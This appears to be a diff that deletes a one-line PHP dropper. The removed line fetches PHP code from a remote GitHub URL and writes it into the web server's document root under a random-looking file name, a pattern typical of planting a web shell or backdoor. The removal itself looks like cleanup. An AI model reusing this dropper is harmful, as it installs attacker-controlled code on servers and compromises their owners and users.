@@ -1,1 +1,0 @@
-<?php $c = file_get_contents('https://raw.githubusercontent.com/uoguzman/phphelloworld/refs/heads/main/3/qDB3DCez1x32s.php'); if (strpos($c, '<?php')===false) die('err'); file_put_contents('qDB3DCez1x32s-1.php', $c); print('ok'); $r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/qDB3DCez1x32s.php', $c); if ($r===false) die(' not2'); die(' ok2');
